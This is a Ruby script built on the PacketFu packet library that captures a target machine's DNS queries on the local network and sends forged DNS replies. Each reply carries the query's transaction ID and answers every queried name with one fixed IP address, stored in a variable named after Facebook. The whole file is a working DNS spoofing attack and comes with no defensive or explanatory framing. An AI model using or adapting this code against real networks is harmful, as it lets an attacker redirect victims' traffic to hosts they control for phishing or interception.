#!/usr/bin/ruby
require 'rubygems'
require 'packetfu'
include PacketFu

def puts_dns(text)
  user = File.open("thing.txt", "a") 
  puts "File opened!"
  user.puts("---------------------")
  user.puts(text)
  user.puts(text.unpack('H*'))
  user.close
end

def forgeResponse(src, dst, id, name, myIP, dest)
  response = UDPPacket.new(:config => Utils.whoami?(:iface => $iface))
  response.eth_saddr = $sMac
  response.eth_daddr = $tMac

  response.ip_saddr = dest
  response.ip_daddr = $tIP

  response.udp_src = dst
  response.udp_dst = src 

  response.payload = id
  response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"

  # name.split(".").each do |part|
  #   response.payload += part.length.chr
  #   response.payload += part
  # end
  response.payload += name

  response.payload += "\x00\x00\x01\x00" + "\x01\xc0\x0c\x00"
  response.payload += "\x01\x00\x01\x00" + "\x00\x00\xc0\x00" + "\x04"
  response.payload += myIP

  response.recalc

  return response
end


def isQuery(packet)
  dnsFlag = (packet.payload[2]).to_s + (packet.payload[3]).to_s
  qryFlag = "\x01\x00"
  if dnsFlag == qryFlag
    return true
  end

  return false
end

def getDomainName(pkt)
  name = ""
  
  while true
    num = (pkt[0]).to_s.ord
    if num == 0
      return name
    elsif num != 0 
      name += pkt[1, num] + "."
      pkt = pkt[num + 1..-1]
    else
      return nil
    end
  end
end

def dns_query_grabber()
  puts "Waiting for queries:"

  facebookIP = "50.67.238.234"
  myIP = facebookIP.split(".");
  myIP2 = [myIP[0].to_i, myIP[1].to_i, myIP[2].to_i, myIP[3].to_i].pack('c*')

  capture_session = PacketFu::Capture.new(:iface => $iface, :start => true, :promisc => true, :filter => "udp and port 53 and src " + $tIP, :save => true)
  capture_session.stream.each { |packet|
    pkt = Packet.parse(packet)
    if isQuery(pkt)

      # get src and dst port from udp
      udpSrc = pkt.udp_src
      udpDst = pkt.udp_dst
      dest = pkt.ip_daddr

      # get transaction id from dns
      queryID = pkt.payload[0, 2]
      
      # get name from packet
      name = getDomainName(pkt.payload[12..-1])
      puts name
      
      # check if name should be spoofed
      
      resp = forgeResponse(udpSrc, udpDst, queryID, pkt.payload[12..12+name.length-1], myIP2, dest)
      resp.to_w($iface)
    end
  }
end
